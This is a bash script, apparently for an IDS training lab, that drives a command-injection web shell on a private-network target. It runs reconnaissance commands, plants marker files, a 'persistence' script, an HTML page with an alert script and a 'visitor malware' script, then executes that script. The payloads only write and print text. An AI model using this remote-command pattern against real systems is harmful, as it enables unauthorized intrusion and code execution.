#!/bin/bash

# Educational Malware Attack Demonstration
# Target: 192.168.56.10 (Victim Server)
# Purpose: Complete demonstration of malware deployment and cross-system infection

echo "=============================================="
echo "ü¶† MALWARE ATTACK DEMONSTRATION - KALI LAB"
echo "=============================================="
echo "Target Server: 192.168.56.10"
echo "Attacker System: $(hostname) - $(hostname -I)"
echo "Attack Time: $(date)"
echo "=============================================="

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

TARGET="192.168.56.10"
VULN_URL="http://$TARGET/vulnerable.php"
MALWARE_ID="DEMO_$(date +%s)"

# Function to pause and wait for user input
pause_for_monitoring() {
    echo -e "${YELLOW}‚è∏Ô∏è  PAUSE: Check your IDS alerts now! Press Enter to continue...${NC}"
    read -p ""
}

# Function to test connectivity
test_connectivity() {
    echo "üîç Testing connectivity to victim server..."
    curl -s --max-time 5 "$VULN_URL?cmd=whoami" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}‚úÖ Connection successful${NC}"
    else
        echo -e "${RED}‚ùå Connection failed - check victim server${NC}"
        exit 1
    fi
}

echo -e "${BLUE}üìç Phase 1: Pre-Attack Reconnaissance${NC}"
echo "----------------------------------------------"
test_connectivity
echo "Victim server info:"
curl -s "$VULN_URL?cmd=uname+-a"
echo ""
curl -s "$VULN_URL?cmd=whoami"
pause_for_monitoring

echo -e "${BLUE}üìç Phase 2: Malware Deployment${NC}"
echo "----------------------------------------------"

echo "ü¶† Step 2.1: Creating malware directory on victim server..."
curl -s "$VULN_URL?cmd=mkdir+-p+/tmp/malware_$MALWARE_ID"
echo "Directory created: /tmp/malware_$MALWARE_ID"

echo "ü¶† Step 2.2: Installing primary malware components..."
curl -s "$VULN_URL?cmd=echo+'=== MALWARE INFECTION LOG ==='+>+/tmp/malware_$MALWARE_ID/infection.txt"
curl -s "$VULN_URL?cmd=echo+'Infection Time: $(date)'+>>+/tmp/malware_$MALWARE_ID/infection.txt"
curl -s "$VULN_URL?cmd=echo+'Victim System: $(hostname)'+>>+/tmp/malware_$MALWARE_ID/infection.txt"
curl -s "$VULN_URL?cmd=echo+'User: $(whoami)'+>>+/tmp/malware_$MALWARE_ID/infection.txt"
curl -s "$VULN_URL?cmd=echo+'Malware ID: $MALWARE_ID'+>>+/tmp/malware_$MALWARE_ID/infection.txt"
curl -s "$VULN_URL?cmd=echo+'Status: ACTIVE INFECTION'+>>+/tmp/malware_$MALWARE_ID/infection.txt"
echo "Malware components installed."

echo "ü¶† Step 2.3: Creating persistence mechanism..."
curl -s "$VULN_URL?cmd=echo+'#!/bin/bash'+>+/tmp/malware_$MALWARE_ID/persistence.sh"
curl -s "$VULN_URL?cmd=echo+'echo \"Malware still active: $MALWARE_ID - \$(date)\" >> /tmp/malware_$MALWARE_ID/infection.txt'+>>+/tmp/malware_$MALWARE_ID/persistence.sh"
curl -s "$VULN_URL?cmd=chmod++x+/tmp/malware_$MALWARE_ID/persistence.sh"
echo "Persistence mechanism created."

pause_for_monitoring

echo -e "${BLUE}üìç Phase 3: Web-Based Infection Vectors${NC}"
echo "----------------------------------------------"

echo "ü¶† Step 3.1: Creating malicious web page for cross-system infection..."
curl -s "$VULN_URL?cmd=echo+'<html><head><title>System Compromised</title></head><body>'+>+/tmp/infected_page_$MALWARE_ID.html"
curl -s "$VULN_URL?cmd=echo+'<h1 style=\"color:red;\">ü¶† SYSTEM COMPROMISED ü¶†</h1>'+>>+/tmp/infected_page_$MALWARE_ID.html"
curl -s "$VULN_URL?cmd=echo+'<p><strong>Malware ID:</strong> $MALWARE_ID</p>'+>>+/tmp/infected_page_$MALWARE_ID.html"
curl -s "$VULN_URL?cmd=echo+'<p><strong>Infection Time:</strong> $(date)</p>'+>>+/tmp/infected_page_$MALWARE_ID.html"
curl -s "$VULN_URL?cmd=echo+'<p><strong>Status:</strong> <span style=\"color:red;\">ACTIVE INFECTION</span></p>'+>>+/tmp/infected_page_$MALWARE_ID.html"
curl -s "$VULN_URL?cmd=echo+'<script>alert(\"MALWARE INFECTION DETECTED!\");</script>'+>>+/tmp/infected_page_$MALWARE_ID.html"
curl -s "$VULN_URL?cmd=echo+'</body></html>'+>>+/tmp/infected_page_$MALWARE_ID.html"
echo "Malicious web page created."

echo "ü¶† Step 3.2: Creating downloadable malware for visitor infection..."
curl -s "$VULN_URL?cmd=echo+'#!/bin/bash'+>+/tmp/visitor_malware_$MALWARE_ID.sh"
curl -s "$VULN_URL?cmd=echo+'echo \"ü¶† VISITOR SYSTEM INFECTED!\"'+>>+/tmp/visitor_malware_$MALWARE_ID.sh"
curl -s "$VULN_URL?cmd=echo+'echo \"Original malware ID: $MALWARE_ID\"'+>>+/tmp/visitor_malware_$MALWARE_ID.sh"
curl -s "$VULN_URL?cmd=echo+'echo \"Visitor infected at: \$(date)\"'+>>+/tmp/visitor_malware_$MALWARE_ID.sh"
curl -s "$VULN_URL?cmd=echo+'mkdir -p /tmp/visitor_infected_$MALWARE_ID'+>>+/tmp/visitor_malware_$MALWARE_ID.sh"
curl -s "$VULN_URL?cmd=echo+'echo \"CROSS-SYSTEM INFECTION SUCCESSFUL\" > /tmp/visitor_infected_$MALWARE_ID/proof.txt'+>>+/tmp/visitor_malware_$MALWARE_ID.sh"
curl -s "$VULN_URL?cmd=chmod++x+/tmp/visitor_malware_$MALWARE_ID.sh"
echo "Visitor malware created."

pause_for_monitoring

echo -e "${BLUE}üìç Phase 4: Infection Verification${NC}"
echo "----------------------------------------------"

echo "ü¶† Step 4.1: Verifying malware installation..."
echo "Malware directory contents:"
curl -s "$VULN_URL?cmd=ls+-la+/tmp/malware_$MALWARE_ID/"
echo ""

echo "ü¶† Step 4.2: Displaying infection log..."
curl -s "$VULN_URL?cmd=cat+/tmp/malware_$MALWARE_ID/infection.txt"
echo ""

echo "ü¶† Step 4.3: Testing cross-system infection vectors..."
echo "Malicious web page content preview:"
curl -s "$VULN_URL?cmd=head+-5+/tmp/infected_page_$MALWARE_ID.html"
echo ""
echo "Visitor malware script preview:"
curl -s "$VULN_URL?cmd=head+-5+/tmp/visitor_malware_$MALWARE_ID.sh"

pause_for_monitoring

echo -e "${BLUE}üìç Phase 5: Cross-System Infection Demonstration${NC}"
echo "----------------------------------------------"

echo "ü¶† Step 5.1: Simulating visitor accessing infected page..."
echo "Accessing infected page (simulates visitor infection):"
curl -s "$VULN_URL?cmd=cat+/tmp/infected_page_$MALWARE_ID.html" | grep -E "(COMPROMISED|Malware|INFECTION)"

echo ""
echo "ü¶† Step 5.2: Simulating malware download and execution..."
echo "Executing visitor malware (simulates download and run):"
curl -s "$VULN_URL?cmd=bash+/tmp/visitor_malware_$MALWARE_ID.sh"

echo ""
echo "ü¶† Step 5.3: Verifying cross-system infection..."
echo "Checking visitor infection evidence:"
curl -s "$VULN_URL?cmd=ls+-la+/tmp/visitor_infected_$MALWARE_ID/"
curl -s "$VULN_URL?cmd=cat+/tmp/visitor_infected_$MALWARE_ID/proof.txt"

pause_for_monitoring

echo ""
echo "=============================================="
echo -e "${GREEN}‚úÖ MALWARE ATTACK DEMONSTRATION COMPLETE${NC}"
echo "=============================================="
echo "Attack Summary:"
echo "‚Ä¢ Primary malware deployed: /tmp/malware_$MALWARE_ID/"
echo "‚Ä¢ Infection log created with system details"
echo "‚Ä¢ Persistence mechanism established"
echo "‚Ä¢ Cross-system infection vectors created"
echo "‚Ä¢ Visitor infection successfully simulated"
echo ""
echo -e "${YELLOW}üìã INFECTION ARTIFACTS CREATED:${NC}"
echo "‚Ä¢ Malware directory: /tmp/malware_$MALWARE_ID/"
echo "‚Ä¢ Infection log: infection.txt"
echo "‚Ä¢ Persistence script: persistence.sh"
echo "‚Ä¢ Malicious web page: /tmp/infected_page_$MALWARE_ID.html"
echo "‚Ä¢ Visitor malware: /tmp/visitor_malware_$MALWARE_ID.sh"
echo "‚Ä¢ Cross-infection evidence: /tmp/visitor_infected_$MALWARE_ID/"
echo ""
echo -e "${YELLOW}üìã DEMONSTRATION URLS:${NC}"
echo "‚Ä¢ View infection log: $VULN_URL?cmd=cat+/tmp/malware_$MALWARE_ID/infection.txt"
echo "‚Ä¢ View malicious page: $VULN_URL?cmd=cat+/tmp/infected_page_$MALWARE_ID.html"
echo "‚Ä¢ Download visitor malware: $VULN_URL?cmd=cat+/tmp/visitor_malware_$MALWARE_ID.sh"
echo ""
echo -e "${RED}‚ö†Ô∏è  This demonstrates both required elements:${NC}"
echo -e "${RED}   1. Malware planted on server ‚úÖ${NC}"
echo -e "${RED}   2. Cross-system infection via site visit ‚úÖ${NC}"
echo ""
echo "End Time: $(date)"
echo "=============================================="
